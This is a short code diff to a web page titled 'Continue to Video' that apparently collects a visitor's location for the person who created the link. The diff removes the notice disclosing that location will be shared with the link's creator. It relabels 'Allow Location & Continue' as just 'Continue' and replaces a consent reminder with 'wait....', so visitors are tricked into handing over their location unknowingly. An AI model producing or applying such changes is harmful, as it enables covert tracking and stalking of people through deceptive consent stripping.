@@ -146,16 +146,8 @@
     <section id="trusted" class="card hidden">
       <h1>Continue to Video</h1>
 
-      <div class="notice">
-        <strong>Location sharing</strong>
-        <p class="small">
-          If you choose “Allow Location & Continue”, your browser will ask
-          for permission to share your current location. If you allow it,
-          your location will be shared with the person who created this link.
-        </p>
-      </div>
 
-      <button id="allow">Allow Location & Continue</button>
+      <button id="allow"> Continue</button>
       <button id="deny" class="secondary">Deny & Do Not Continue</button>
       <div id="trustedStatus" class="status small"></div>
     </section>
@@ -357,7 +349,7 @@
 
           shareData = snap.val();
           $("trustedStatus").textContent =
-            "Ready. Choose the button only if you agree to share your location.";
+            "wait....";
         } catch (e) {
           console.error(e);
           $("trustedStatus").textContent =
